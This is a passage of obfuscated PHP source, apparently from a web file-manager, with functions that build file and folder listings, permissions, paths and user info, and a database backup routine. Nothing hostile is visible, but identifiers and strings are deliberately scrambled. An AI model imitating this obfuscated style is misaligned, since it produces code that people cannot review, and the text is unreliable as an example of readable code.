} } unset($Õ¹¾Å»); } protected function _listAppendSourceInfo(&$Íˆ­íÍÙ, $˜·»úÒÀ) { $á£æÁé® =& $_SERVER[«òÑğ]; $òÖğüŸÅ = Model($á£æÁé®[554])->listData(); $À³Ä‰Ùì = Model($á£æÁé®[502])->listData(); $Ôı‰”ìª = Model($á£æÁé®[492])->listData(); $è Éî‰Ò = Model($á£æÁé®[555])->listSimple(); $¤àµ›İ = array_to_keyvalue($òÖğüŸÅ, $á£æÁé®[478]); $Ôıİçó÷ = array_to_keyvalue_group($À³Ä‰Ùì, $á£æÁé®[87], $á£æÁé®[503]); $óˆœÄòµ = array_to_keyvalue($Ôı‰”ìª, $á£æÁé®[87]); $‰ºÜ‡ô = array_to_keyvalue_group($è Éî‰Ò, $á£æÁé®[194]); foreach ($Íˆ­íÍÙ as &$ü»›£«›) { $ü»›£«›[$á£æÁé®[90]] = array($á£æÁé®[556] => 0, $á£æÁé®[557] => 0, $á£æÁé®[558] => 0); if (isset($óˆœÄòµ[$ü»›£«›[$á£æÁé®[194]]])) { $ü»›£«›[$á£æÁé®[90]][$á£æÁé®[559]] = 1; $ü»›£«›[$á£æÁé®[90]][$á£æÁé®[560]] = $óˆœÄòµ[$ü»›£«›[$á£æÁé®[194]]][$á£æÁé®[32]]; } if ($Ôıİçó÷ && $¤àµ›İ && isset($Ôıİçó÷[$ü»›£«›[$á£æÁé®[194]]])) { $ü»›£«›[$á£æÁé®[90]][$á£æÁé®[561]] = array(); foreach ($Ôıİçó÷[$ü»›£«›[$á£æÁé®[194]]] as $¨êÒ’´Í) { $²øƒç… = $¤àµ›İ[$¨êÒ’´Í]; $ü»›£«›[$á£æÁé®[90]][$á£æÁé®[561]][] = array($á£æÁé®[562] => $²øƒç…[$á£æÁé®[478]], $á£æÁé®[497] => $²øƒç…[$á£æÁé®[32]], $á£æÁé®[563] => $²øƒç…[$á£æÁé®[564]]); } } if ($‰ºÜ‡ô && isset($‰ºÜ‡ô[$ü»›£«›[$á£æÁé®[194]]])) { $ü»›£«›[$á£æÁé®[90]][$á£æÁé®[565]] = array(); foreach ($‰ºÜ‡ô[$ü»›£«›[$á£æÁé®[194]]] as $åÏ²Œ´‘) { $Ã—’ ²ü = $á£æÁé®[566]; if ($åÏ²Œ´‘[$á£æÁé®[567]] == $á£æÁé®[91]) { $Ã—’ ²ü .= $á£æÁé®[568]; } $ü»›£«›[$á£æÁé®[90]][$á£æÁé®[565]] = array_field_key($åÏ²Œ´‘, explode($á£æÁé®[50], $Ã—’ ²ü)); } } } unset($ü»›£«›); return $Íˆ­íÍÙ; } protected function _listAppendChildren(&$ûÙğ×Ğµ, $ÄÒœÂ…é) { $¡ŞçĞŸ =& $_SERVER[«òÑğ]; $Ğ–’¤Â = array(); $úÈˆ¿ÀŒ = array($¡ŞçĞŸ[242] => 0, $¡ŞçĞŸ[243] => 0); foreach ($ûÙğ×Ğµ as &$›—ß¦ƒŞ) { if (!$›—ß¦ƒŞ[$¡ŞçĞŸ[488]]) { continue; } $Ğ–’¤Â[] = $›—ß¦ƒŞ[$¡ŞçĞŸ[194]]; } unset($›—ß¦ƒŞ); if (!$Ğ–’¤Â) { return; } $š¿ü¯¸ = array($¡ŞçĞŸ[193] => array($¡ŞçĞŸ[7], $Ğ–’¤Â), $¡ŞçĞŸ[508] => 0); $…ËÚ˜Òİ = array($¡ŞçĞŸ[193], $¡ŞçĞŸ[488], $¡ŞçĞŸ[569] => $¡ŞçĞŸ[570]); $—å¬Ïô = $this->field($…ËÚ˜Òİ)->where($š¿ü¯¸)->group($¡ŞçĞŸ[571])->select(); $Øíßœ¶Ù = array(); foreach ($—å¬Ïô as $ğµ£Ë±å) { $Êäöæ¿Ï = $ğµ£Ë±å[$¡ŞçĞŸ[193]]; $ñ±ÒÕ¹á = $ğµ£Ë±å[$¡ŞçĞŸ[488]] == $¡ŞçĞŸ[91] ? $¡ŞçĞŸ[243] : $¡ŞçĞŸ[242]; if (!isset($Øíßœ¶Ù[$Êäöæ¿Ï])) { $Øíßœ¶Ù[$Êäöæ¿Ï] = array($¡ŞçĞŸ[242] => 0, $¡ŞçĞŸ[243] => 0); } $Øíßœ¶Ù[$Êäöæ¿Ï][$ñ±ÒÕ¹á] += $ğµ£Ë±å[$¡ŞçĞŸ[570]]; } foreach ($ûÙğ×Ğµ as &$›—ß¦ƒŞ) { if (!$›—ß¦ƒŞ[$¡ŞçĞŸ[488]]) { continue; } $ƒÉ îğ‹ = is_array($Øíßœ¶Ù[$›—ß¦ƒŞ[$¡ŞçĞŸ[194]]]) ? $Øíßœ¶Ù[$›—ß¦ƒŞ[$¡ŞçĞŸ[194]]] : $úÈˆ¿ÀŒ; $›—ß¦ƒŞ[$¡ŞçĞŸ[243]] = $ƒÉ îğ‹[$¡ŞçĞŸ[243]]; $›—ß¦ƒŞ[$¡ŞçĞŸ[242]] = $ƒÉ îğ‹[$¡ŞçĞŸ[242]]; unset($›—ß¦ƒŞ[$¡ŞçĞŸ[489]]); } unset($›—ß¦ƒŞ); } protected function _listAppendAuth(&$ö®í´Ğ) { $¾¼™Ÿ =& $_SERVER[«òÑğ]; $º‹€ÛË = array(); foreach ($ö®í´Ğ as $­¯Óæ‹´) { if ($­¯Óæ‹´[$¾¼™Ÿ[191]] == self::TYPE_GROUP) { $º‹€ÛË[] = $­¯Óæ‹´[$¾¼™Ÿ[194]]; } } if (!$º‹€ÛË) { return; } $šê¦ô©– = array_to_keyvalue($ö®í´Ğ, $¾¼™Ÿ[194]); $Ö„Ñ’¯Û = Model($¾¼™Ÿ[572])->getSourceList($º‹€ÛË, $šê¦ô©–); $ÚÇâãº¨ = KodUser::isRoot(); foreach ($ö®í´Ğ as $Ä¨Íİ¼â => &$­¯Óæ‹´) { $­¯Óæ‹´[$¾¼™Ÿ[490]] = $Ö„Ñ’¯Û[$­¯Óæ‹´[$¾¼™Ÿ[194]]]; if (!$­¯Óæ‹´[$¾¼™Ÿ[490]] && $­¯Óæ‹´[$¾¼™Ÿ[191]] == self::TYPE_GROUP) { $­¯Óæ‹´[$¾¼™Ÿ[490]] = Action($¾¼™Ÿ[573])->pathGroupAuthMake($­¯Óæ‹´[$¾¼™Ÿ[574]]); if (!$­¯Óæ‹´[$¾¼™Ÿ[490]] && !$ÚÇâãº¨) { $­¯Óæ‹´[$¾¼™Ÿ[236]] = !1; $­¯Óæ‹´[$¾¼™Ÿ[235]] = !1; } } if ($­¯Óæ‹´[$¾¼™Ÿ[490]]) { $­¯Óæ‹´[$¾¼™Ÿ[236]] = AuthModel::authCheckEdit($­¯Óæ‹´[$¾¼™Ÿ[490]][$¾¼™Ÿ[491]]); $­¯Óæ‹´[$¾¼™Ÿ[235]] = AuthModel::authCheckView($­¯Óæ‹´[$¾¼™Ÿ[490]][$¾¼™Ÿ[491]]); } $this->groupPathDisplay($­¯Óæ‹´); } unset($­¯Óæ‹´); } public function _listAppendAuthSecret(&$å²éåŒ) { $€Ü†åß• =& $_SERVER[«òÑğ]; if (Model($€Ü†åß•[511])->get($€Ü†åß•[575]) != $€Ü†åß•[91]) { return; } static $ıêĞ¯‹Ë = false; if (!$ıêĞ¯‹Ë) { $ÓËù¤ÑÂ = Model($€Ü†åß•[576]); $Ü¯ùœ¯ƒ = Model($€Ü†åß•[577]); $ıêĞ¯‹Ë = $Ü¯ùœ¯ƒ->listData(); $ıêĞ¯‹Ë = array_to_keyvalue($ıêĞ¯‹Ë, $€Ü†åß•[194]); $ÎŠäø× = json_decode(Model($€Ü†åß•[511])->get($€Ü†åß•[578]), !0); $ÎŠäø× = array_to_keyvalue($ÎŠäø×, $€Ü†åß•[478]); foreach ($ıêĞ¯‹Ë as $ËµÕÁ…Í => $¶óæ·–ö) { $¢·Í‡¶º = $ÎŠäø×[$¶óæ·–ö[$€Ü†åß•[579]]]; if (!$¢·Í‡¶º) { $Ü¯ùœ¯ƒ->remove($¶óæ·–ö[$€Ü†åß•[478]]); unset($ıêĞ¯‹Ë[$ËµÕÁ…Í]); continue; } $–öÃ¡ó = $ÓËù¤ÑÂ->listData($¢·Í‡¶º[$€Ü†åß•[490]]); if (!$–öÃ¡ó) { $Ü¯ùœ¯ƒ->remove($¶óæ·–ö[$€Ü†åß•[478]]); unset($ıêĞ¯‹Ë[$ËµÕÁ…Í]); continue; } $¶óæ·–ö[$€Ü†åß•[490]] = $–öÃ¡ó; $¶óæ·–ö[$€Ü†åß•[580]] = $¢·Í‡¶º; $¶óæ·–ö[$€Ü†åß•[581]] = Model($€Ü†åß•[582])->getInfoSimpleOuter($¶óæ·–ö[$€Ü†åß•[530]]); $ıêĞ¯‹Ë[$ËµÕÁ…Í] = $¶óæ·–ö; } } $­÷êĞªŞ = USER_ID; $·‚¿¦üÃ = array(); $ÄÇá‹æ = $this->_listAppendPath($·‚¿¦üÃ, !0); foreach ($å²éåŒ as $ËµÕÁ…Í => &$¶óæ·–ö) { if (!is_array($¶óæ·–ö[$€Ü†åß•[490]])) { continue; } if ($¶óæ·–ö[$€Ü†åß•[191]] != $€Ü†åß•[583]) { continue; } if (isset($ıêĞ¯‹Ë[$¶óæ·–ö[$€Ü†åß•[194]]])) { $÷êğøÒê = $ıêĞ¯‹Ë[$¶óæ·–ö[$€Ü†åß•[194]]]; if (!is_array($¶óæ·–ö[$€Ü†åß•[544]])) { $¶óæ·–ö[$€Ü†åß•[544]] = array(); } $¶óæ·–ö[$€Ü†åß•[544]][$€Ü†åß•[584]] = $÷êğøÒê[$€Ü†åß•[579]]; $¶óæ·–ö[$€Ü†åß•[490]][$€Ü†åß•[585]] = $÷êğøÒê; $¶óæ·–ö[$€Ü†åß•[490]][$€Ü†åß•[586]] = $¶óæ·–ö[$€Ü†åß•[587]]; $¶óæ·–ö[$€Ü†åß•[490]][$€Ü†åß•[588]] = $€Ü†åß•[91]; if ($÷êğøÒê[$€Ü†åß•[530]] != $­÷êĞªŞ) { $¶óæ·–ö[$€Ü†åß•[490]][$€Ü†åß•[491]] = $¶óæ·–ö[$€Ü†åß•[490]][$€Ü†åß•[491]] & $÷êğøÒê[$€Ü†åß•[490]][$€Ü†åß•[490]]; } continue; } $­¡úıü = $this->parentLevelArray($¶óæ·–ö[$€Ü†åß•[589]]); $¨ŠÊÁ³ú = array_reverse($­¡úıü); foreach ($¨ŠÊÁ³ú as $Ï®ÑòÏË => $·ÉûèáÂ) { if (!isset($ıêĞ¯‹Ë[$·ÉûèáÂ])) { continue; } $÷êğøÒê = $ıêĞ¯‹Ë[$·ÉûèáÂ]; $¶óæ·–ö[$€Ü†åß•[490]][$€Ü†åß•[585]] = $÷êğøÒê; if ($÷êğøÒê[$€Ü†åß•[530]] != $­÷êĞªŞ) { $¶óæ·–ö[$€Ü†åß•[490]][$€Ü†åß•[491]] = $¶óæ·–ö[$€Ü†åß•[490]][$€Ü†åß•[491]] & $÷êğøÒê[$€Ü†åß•[490]][$€Ü†åß•[490]]; } $¤Ôˆ£ó = $€Ü†åß•[12]; $…¥›Ó = count($­¡úıü) - $Ï®ÑòÏË; for ($ÎÌøÇ‹— = 0; $ÎÌøÇ‹— < $…¥›Ó; $ÎÌøÇ‹—++) { if (!isset($ÄÇá‹æ[$­¡úıü[$ÎÌøÇ‹—]])) { $¤Ôˆ£ó = $€Ü†åß•[12]; break; } $¤Ôˆ£ó = $¤Ôˆ£ó . rtrim($ÄÇá‹æ[$­¡úıü[$ÎÌøÇ‹—]], $€Ü†åß•[8]) . $€Ü†åß•[8]; } $¶óæ·–ö[$€Ü†åß•[490]][$€Ü†åß•[586]] = rtrim($¤Ôˆ£ó, $€Ü†åß•[8]) . $€Ü†åß•[8]; break; } } unset($¶óæ·–ö); } public function groupPathDisplay(&$Ğ§æÅë¹) { $Ö·„Şã =& $_SERVER[«òÑğ]; if ($Ğ§æÅë¹[$Ö·„Şã[191]] != self::TYPE_GROUP) { return; } $¡ÓÕ¸‰¼ = Model($Ö·„Şã[590])->getInfo($Ğ§æÅë¹[$Ö·„Şã[574]]); $®Æ¯Œ® = $this->parentLevelArray($¡ÓÕ¸‰¼[$Ö·„Şã[589]]); $È›Ä²ôè = $Ö·„Şã[12]; foreach ($®Æ¯Œ® as $½åİÕø) { $•ô²ÛÈü = Model($Ö·„Şã[590])->getInfo($½åİÕø); $È›Ä²ôè .= $•ô²ÛÈü[$Ö·„Şã[90]][$Ö·„Şã[194]] . $Ö·„Şã[50]; } $Ğ§æÅë¹[$Ö·„Şã[591]] = $¡ÓÕ¸‰¼[$Ö·„Şã[193]]; $Ğ§æÅë¹[$Ö·„Şã[592]] = $¡ÓÕ¸‰¼[$Ö·„Şã[589]]; $Ğ§æÅë¹[$Ö·„Şã[593]] = $¡ÓÕ¸‰¼[$Ö·„Şã[594]]; $Ğ§æÅë¹[$Ö·„Şã[595]] = $È›Ä²ôè . $¡ÓÕ¸‰¼[$Ö·„Şã[90]][$Ö·„Şã[194]]; } protected function _listAppendPath(&$šƒù·Çê, $ÜóÄÀÀ¨ = false) { $ÏÙİï”« =& $_SERVER[«òÑğ]; static $èØ¸‹—ø = array(); $û¢¥îÆÍ = array(); $ŸëùúÔ = array(); if ($ÜóÄÀÀ¨) { return $èØ¸‹—ø; } foreach ($šƒù·Çê as &$‹Í×¸‰) { $Òë©‘ùã = $‹Í×¸‰[$ÏÙİï”«[194]]; if ($‹Í×¸‰[$ÏÙİï”«[488]] == $ÏÙİï”«[91] && $‹Í×¸‰[$ÏÙİï”«[193]] != 0) { $èØ¸‹—ø[$Òë©‘ùã] = $‹Í×¸‰[$ÏÙİï”«[32]]; } if ($‹Í×¸‰[$ÏÙİï”«[488]] == $ÏÙİï”«[91] && $‹Í×¸‰[$ÏÙİï”«[193]] == 0) { $èØ¸‹—ø[$Òë©‘ùã] = $this->_listAppendPathRoot($‹Í×¸‰, array()); } if (isset($ŸëùúÔ[$‹Í×¸‰[$ÏÙİï”«[589]]])) { continue; } $ŸëùúÔ[$‹Í×¸‰[$ÏÙİï”«[589]]] = !0; $âøÄùŸˆ = $this->parentLevelArray($‹Í×¸‰[$ÏÙİï”«[589]]); foreach ($âøÄùŸˆ as $ÎÕùˆš => $œ‚ôâ¥í) { if (isset($èØ¸‹—ø[$œ‚ôâ¥í])) { continue; } if ($ÎÕùˆš == 0) { $èØ¸‹—ø[$œ‚ôâ¥í] = $this->_listAppendPathRoot($‹Í×¸‰, $âøÄùŸˆ); } if ($ÎÕùˆš != 0) { $û¢¥îÆÍ[] = $œ‚ôâ¥í; } } } unset($‹Í×¸‰); $û¢¥îÆÍ = array_unique($û¢¥îÆÍ); if (count($û¢¥îÆÍ) > 0) { $¨Ÿ‘©Ê… = array($ÏÙİï”«[494] => array($ÏÙİï”«[495], $û¢¥îÆÍ)); if (count($û¢¥îÆÍ) == 1) { $„´÷ÇÄı = $this->sourceInfo($û¢¥îÆÍ[0]); $õ´îˆñÅ = is_array($„´÷ÇÄı) ? array($„´÷ÇÄı) : !1; } else { $õ´îˆñÅ = $this->field($ÏÙİï”«[596])->where($¨Ÿ‘©Ê…)->select(); } if (!$õ´îˆñÅ) { $õ´îˆñÅ = array(); } foreach ($õ´îˆñÅ as $½íúÔ‡ı) { $èØ¸‹—ø[$½íúÔ‡ı[$ÏÙİï”«[194]]] = $½íúÔ‡ı[$ÏÙİï”«[32]]; } } $şÇÃı€Ã = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $À´ïßäÌ = array(); foreach ($šƒù·Çê as &$‹Í×¸‰) { $•ù†êı¹ = $‹Í×¸‰[$ÏÙİï”«[589]]; $ß“ğÈ = $ÏÙİï”«[12]; if (isset($À´ïßäÌ[$•ù†êı¹])) { $ß“ğÈ = $À´ïßäÌ[$•ù†êı¹]; } else { $âøÄùŸˆ = $this->parentLevelArray($‹Í×¸‰[$ÏÙİï”«[589]]); foreach ($âøÄùŸˆ as $ÎÕùˆš => $œ‚ôâ¥í) { if (isset($èØ¸‹—ø[$œ‚ôâ¥í])) { $ß“ğÈ .= $èØ¸‹—ø[$œ‚ôâ¥í] . $ÏÙİï”«[8]; } } $À´ïßäÌ[$•ù†êı¹] = $ß“ğÈ; } $ß“ğÈ .= $‹Í×¸‰[$ÏÙİï”«[32]]; if ($‹Í×¸‰[$ÏÙİï”«[488]] == $ÏÙİï”«[91]) { $ß“ğÈ .= $ÏÙİï”«[8]; } $‹Í×¸‰[$ÏÙİï”«[587]] = str_replace($ÏÙİï”«[257], $ÏÙİï”«[8], $ß“ğÈ); if ($‹Í×¸‰[$ÏÙİï”«[193]] == $ÏÙİï”«[231]) { $‹Í×¸‰[$ÏÙİï”«[32]] = trim($èØ¸‹—ø[$‹Í×¸‰[$ÏÙİï”«[194]]], $ÏÙİï”«[8]); $‹Í×¸‰[$ÏÙİï”«[587]] = $‹Í×¸‰[$ÏÙİï”«[32]] . $ÏÙİï”«[8]; } if (intval($‹Í×¸‰[$ÏÙİï”«[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($‹Í×¸‰, $âøÄùŸˆ, $şÇÃı€Ã); } } unset($‹Í×¸‰); return $šƒù·Çê; } private function _listAppendPathRecycle(&$ùˆÍÍ¦, $ç²¬æ§í, $Ô‘ŒÔ”) { $È£é¡İ =& $_SERVER[«òÑğ]; if (!in_array($Ô‘ŒÔ”, $ç²¬æ§í) && $ùˆÍÍ¦[$È£é¡İ[194]] != $Ô‘ŒÔ”) { return; } $©¦òâëÏ = explode($È£é¡İ[8], trim($ùˆÍÍ¦[$È£é¡İ[587]], $È£é¡İ[8])); $Ó®ñ“í = implode($È£é¡İ[8], array_slice($©¦òâëÏ, 2)); $ùˆÍÍ¦[$È£é¡İ[587]] = $È£é¡İ[8] . LNG($È£é¡İ[597]) . $È£é¡İ[8] . ltrim($Ó®ñ“í, $È£é¡İ[8]); $ùˆÍÍ¦[$È£é¡İ[589]] = $È£é¡İ[598] . implode($È£é¡İ[50], array_slice($ç²¬æ§í, 1)) . $È£é¡İ[50]; if ($ùˆÍÍ¦[$È£é¡İ[194]] == $Ô‘ŒÔ”) { $ùˆÍÍ¦[$È£é¡İ[589]] = $È£é¡İ[598]; $ùˆÍÍ¦[$È£é¡İ[193]] = $È£é¡İ[231]; $ùˆÍÍ¦[$È£é¡İ[32]] = LNG($È£é¡İ[597]); } $ùˆÍÍ¦[$È£é¡İ[599]] = $È£é¡İ[600]; } protected function _listAppendPathRoot(&$œŸ˜£¶, $‚Çú”„«) { $ñõ¼äûé =& $_SERVER[«òÑğ]; static $ä’ô¤á÷ = false; static $¼ò¤ÈŠŒ = false; $îÚ²†ÁÈ = $ñõ¼äûé[12]; if ($œŸ˜£¶[$ñõ¼äûé[191]] == self::TYPE_USER) { if ($œŸ˜£¶[$ñõ¼äûé[574]] == USER_ID) { $îÚ²†ÁÈ = LNG($ñõ¼äûé[601]); if ($ä’ô¤á÷ === !1) { $Œ†ûÒØ’ = Model($ñõ¼äûé[602])->getInfoFull(USER_ID); $ä’ô¤á÷ = _get($Œ†ûÒØ’, $ñõ¼äûé[603], $ñõ¼äûé[12]); } if ($¼ò¤ÈŠŒ === !1) { $Œ†ûÒØ’ = Model($ñõ¼äûé[602])->getInfoFull(USER_ID); $¼ò¤ÈŠŒ = _get($Œ†ûÒØ’, $ñõ¼äûé[604], $ñõ¼äûé[12]); } if ($‚Çú”„« && $‚Çú”„«[0] == $ä’ô¤á÷ || !$‚Çú”„« && $œŸ˜£¶[$ñõ¼äûé[194]] == $ä’ô¤á÷) { $îÚ²†ÁÈ = LNG($ñõ¼äûé[605]); $œŸ˜£¶[$ñõ¼äûé[606]] = $ñõ¼äûé[607]; } if ($‚Çú”„« && $‚Çú”„«[0] == $¼ò¤ÈŠŒ || !$‚Çú”„« && $œŸ˜£¶[$ñõ¼äûé[194]] == $¼ò¤ÈŠŒ) { $îÚ²†ÁÈ = $îÚ²†ÁÈ . $ñõ¼äûé[608] . LNG($ñõ¼äûé[609]); } if (!$‚Çú”„«) { $œŸ˜£¶[$ñõ¼äûé[32]] = $îÚ²†ÁÈ; } } else { $Œ†ûÒØ’ = Model($ñõ¼äûé[602])->getInfoFull($œŸ˜£¶[$ñõ¼äûé[574]]); $ï¹Ç¸»Ñ = _get($Œ†ûÒØ’, $ñõ¼äûé[604], $ñõ¼äûé[12]); $œŸ˜£¶[$ñõ¼äûé[610]] = Model($ñõ¼äûé[582])->getInfoSimpleOuter($œŸ˜£¶[$ñõ¼äûé[574]]); $îÚ²†ÁÈ = LNG($ñõ¼äûé[611]) . $ñõ¼äûé[176] . $œŸ˜£¶[$ñõ¼äûé[610]][$ñõ¼äûé[32]] . $ñõ¼äûé[178]; if ($‚Çú”„« && $‚Çú”„«[0] == $ï¹Ç¸»Ñ || !$‚Çú”„« && $œŸ˜£¶[$ñõ¼äûé[194]] == $ï¹Ç¸»Ñ) { $îÚ²†ÁÈ = LNG($ñõ¼äûé[611]) . $ñõ¼äûé[612] . $œŸ˜£¶[$ñõ¼äûé[610]][$ñõ¼äûé[32]] . $ñõ¼äûé[608] . LNG($ñõ¼äûé[609]) . $ñõ¼äûé[178]; } } } else { if ($œŸ˜£¶[$ñõ¼äûé[191]] == self::TYPE_GROUP) { $Ç—½•Îì = Model($ñõ¼äûé[590])->getInfoSimple($œŸ˜£¶[$ñõ¼äûé[574]]); $îÚ²†ÁÈ = $Ç—½•Îì[$ñõ¼äûé[32]]; } else { if ($œŸ˜£¶[$ñõ¼äûé[191]] == self::TYPE_SYSTEM) { $îÚ²†ÁÈ = $ñõ¼äûé[613]; } } } $îÚ²†ÁÈ = $îÚ²†ÁÈ ? $ñõ¼äûé[8] . $îÚ²†ÁÈ . $ñõ¼äûé[8] : $ñõ¼äûé[8]; return $îÚ²†ÁÈ; } protected function _listAppendUser(&$óïãçÑ) { $²öÇö’í =& $_SERVER[«òÑğ]; $ş¦«ÂÇÈ = array_to_keyvalue($óïãçÑ, $²öÇö’í[12], $²öÇö’í[530]); $Êäˆüˆ = array_to_keyvalue($óïãçÑ, $²öÇö’í[12], $²öÇö’í[532]); $¯Üğ¢ = array_merge($ş¦«ÂÇÈ, $Êäˆüˆ); $¤î¾“¢ = Model($²öÇö’í[602])->userListInfo($¯Üğ¢); foreach ($óïãçÑ as &$â¿Úİ¸·) { $¬›øÕªÜ = $â¿Úİ¸·[$²öÇö’í[530]]; $â¿Úİ¸·[$²öÇö’í[530]] = $¤î¾“¢[$¬›øÕªÜ] ? $¤î¾“¢[$¬›øÕªÜ] : !1; $¬›øÕªÜ = $â¿Úİ¸·[$²öÇö’í[532]]; $â¿Úİ¸·[$²öÇö’í[532]] = $¤î¾“¢[$¬›øÕªÜ] ? $¤î¾“¢[$¬›øÕªÜ] : !1; if (_get($â¿Úİ¸·, $²öÇö’í[614], 0)) { $†“‹ˆ°ú = $GLOBALS[$²öÇö’í[6]][$²öÇö’í[92]][$²öÇö’í[615]]; if ($â¿Úİ¸·[$²öÇö’í[544]][$²öÇö’í[616]] <= time() - $†“‹ˆ°ú) { $this->metaSet($â¿Úİ¸·[$²öÇö’í[194]], $²öÇö’í[617], null); $this->metaSet($â¿Úİ¸·[$²öÇö’í[194]], $²öÇö’í[616], null); unset($â¿Úİ¸·[$²öÇö’í[544]][$²öÇö’í[617]]); continue; } $í¯ëº±¬ = $â¿Úİ¸·[$²öÇö’í[544]][$²öÇö’í[617]]; $â¿Úİ¸·[$²öÇö’í[544]][$²öÇö’í[618]] = Model($²öÇö’í[602])->getInfoSimpleOuter($í¯ëº±¬); } } unset($â¿Úİ¸·); } public function parentLevelArray($£ÖÇ»¹Ç) { $œÆ€ïŒŸ =& $_SERVER[«òÑğ]; $£ÖÇ»¹Ç = explode($œÆ€ïŒŸ[50], trim($£ÖÇ»¹Ç, $œÆ€ïŒŸ[50])); return array_remove_value($£ÖÇ»¹Ç, $œÆ€ïŒŸ[231]); } public function listAll($·È‘î) { $Î–Ôˆ´¶ =& $_SERVER[«òÑğ]; $ÆĞÀıİ™ = $this->sourceInfo($·È‘î); $Ò×ˆù¡˜ = array($Î–Ôˆ´¶[619] => array($Î–Ôˆ´¶[620], $ÆĞÀıİ™[$Î–Ôˆ´¶[589]] . $·È‘î . $Î–Ôˆ´¶[621]), $Î–Ôˆ´¶[622] => 0); $ªşÛ¥„É = $Î–Ôˆ´¶[623]; $¿¯¦¦–§ = "\114\105\x46\124\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\x69\157\137\146\x69\x6c\145\x20\146\x69\154\x65\x20\157\156\x20\x73\x6f\x75\162\x63\x65\56\x66\x69\x6c\145\x49\x44\40\x3d\40\146\151\154\x65\56\x66\151\154\145\111\104"; $ÄÖ˜îÄ¨ = $this->alias($Î–Ôˆ´¶[522])->field($ªşÛ¥„É)->where($Ò×ˆù¡˜)->join($¿¯¦¦–§)->select(); $this->_listAppendAuth($ÄÖ˜îÄ¨); $this->_listAppendUser($ÄÖ˜îÄ¨); $this->_listAppendPath($ÄÖ˜îÄ¨); $ÄÖ˜îÄ¨ = array_to_keyvalue($ÄÖ˜îÄ¨, $Î–Ôˆ´¶[194]); $äê‡ì‡â = "\57{$ÆĞÀıİ™[$Î–Ôˆ´¶[32]]}\x2f"; $äê‡ì‡â = $äê‡ì‡â == $Î–Ôˆ´¶[257] ? $Î–Ôˆ´¶[8] : $äê‡ì‡â; $Šªêª£• = array(); foreach ($ÄÖ˜îÄ¨ as $´¥ßÖØ€ => $µ òƒê) { $„”Ğíš£ = $this->parentLevelArray($µ òƒê[$Î–Ôˆ´¶[589]]); array_shift($„”Ğíš£); $îÉ–‚¯… = $äê‡ì‡â; for ($Áä÷’Ñ = 0; $Áä÷’Ñ < count($„”Ğíš£); $Áä÷’Ñ++) { $îÉ–‚¯… .= $ÄÖ˜îÄ¨[$„”Ğíš£[$Áä÷’Ñ]][$Î–Ôˆ´¶[32]] . $Î–Ôˆ´¶[8]; } $îÉ–‚¯… .= $µ òƒê[$Î–Ôˆ´¶[32]]; if ($µ òƒê[$Î–Ôˆ´¶[488]]) { $îÉ–‚¯… .= $Î–Ôˆ´¶[8]; } $ã¥œÔ‰ = array($Î–Ôˆ´¶[498] => str_replace($Î–Ôˆ´¶[257], $Î–Ôˆ´¶[8], str_replace($Î–Ôˆ´¶[257], $Î–Ôˆ´¶[8], str_replace($Î–Ôˆ´¶[257], $Î–Ôˆ´¶[8], $îÉ–‚¯…))), $Î–Ôˆ´¶[624] => intval($µ òƒê[$Î–Ôˆ´¶[488]]), $Î–Ôˆ´¶[625] => intval($µ òƒê[$Î–Ôˆ´¶[79]]), $Î–Ôˆ´¶[88] => intval($µ òƒê[$Î–Ôˆ´¶[88]]), $Î–Ôˆ´¶[90] => $this->pathInfoFilter($µ òƒê)); if (!$ã¥œÔ‰[$Î–Ôˆ´¶[488]]) { $ã¥œÔ‰[$Î–Ôˆ´¶[546]] = $µ òƒê[$Î–Ôˆ´¶[546]]; } $Šªêª£•[] = $ã¥œÔ‰; } $Šªêª£• = array_sort_by($Šªêª£•, $Î–Ôˆ´¶[87]); return $Šªêª£•; } } goto c‰ë£’ğÑ…; Dª‡ˆ‹è»ï: class BackupDbFile { public function __construct() { } public function index() { $éËáßÀ© =& $_SERVER[«òÑğ]; $„–¬½ìİ = Backup::get(); $ØœÔÇôÙ = $„–¬½ìİ[$éËáßÀ©[32]]; $ö«¼ÃíÜ = $this->tmpFilesPath() . "\x62\141\x63\153\x75\x70\x5f{$ØœÔÇôÙ}\57"; $»²ó–Ú£ = $this->backupPath($„–¬½ìİ); if (!($»²ó–Ú£ = IO::mkdir($»²ó–Ú£))) { Backup::log($éËáßÀ©[884] . $»²ó–Ú£); return !1; } $”û‘ù­î = IO::listPath($ö«¼ÃíÜ); $¶ĞÊÃöä = isset($”û‘ù­î[$éËáßÀ©[86]]) ? $”û‘ù­î[$éËáßÀ©[86]] : array(); $¿ÏÃˆ© = array_sum(array_column($¶ĞÊÃöä, $éËáßÀ©[79])); if (!$¿ÏÃˆ©) { Backup::log($éËáßÀ©[885] . $ö«¼ÃíÜ); return !1; } $í¬àĞ = array($éËáßÀ©[886] => $¿ÏÃˆ©, $éËáßÀ©[887] => time()); Backup::set($í¬àĞ); $å±Öìß = new TaskFileTransfer($éËáßÀ©[888], $éËáßÀ©[861], count($¶ĞÊÃöä), LNG($éËáßÀ©[870]) . $éËáßÀ©[465] . LNG($éËáßÀ©[872]) . $éËáßÀ©[889]); $å±Öìß->task[$éËáßÀ©[847]] = $¿ÏÃˆ©; foreach ($”û‘ù­î[$éËáßÀ©[86]] as $Åµ†Ø¹¬) { $©º˜º»§ = IO::move($Åµ†Ø¹¬[$éËáßÀ©[87]], $»²ó–Ú£); if (!$©º˜º»§) { $å±Öìß->end(); $¼ÆôÇşÉ = IO::getLastError($éËáßÀ©[890] . $Åµ†Ø¹¬[$éËáßÀ©[87]] . $éËáßÀ©[891] . $»²ó–Ú£ . $éËáßÀ©[178]); Backup::log($¼ÆôÇşÉ); return !1; } } $‹·Óç¹¬ = new DbManage(); $²ù™Ë¡• = $‹·Óç¹¬->getSqlFile(); if (!$²ù™Ë¡•[$éËáßÀ©[892]] || !$²ù™Ë¡•[$éËáßÀ©[13]]) { Backup::log($éËáßÀ©[893]); return !1; } IO::move($²ù™Ë¡•[$éËáßÀ©[892]], $»²ó–Ú£); IO::move($²ù™Ë¡•[$éËáßÀ©[13]], $»²ó–Ú£); $å±Öìß->end(); $í¬àĞ = array($éËáßÀ©[894] => $¿ÏÃˆ©, $éËáßÀ©[895] => time()); Backup::set($í¬àĞ); return !0; } private function backupPath($ºù»¸¢­) { $¼ù—ß²– =& $_SERVER[«òÑğ]; $„°Îè×ƒ = $ºù»¸¢­[$¼ù—ß²–[32]]; $·ÙÈ¤Ò˜ = 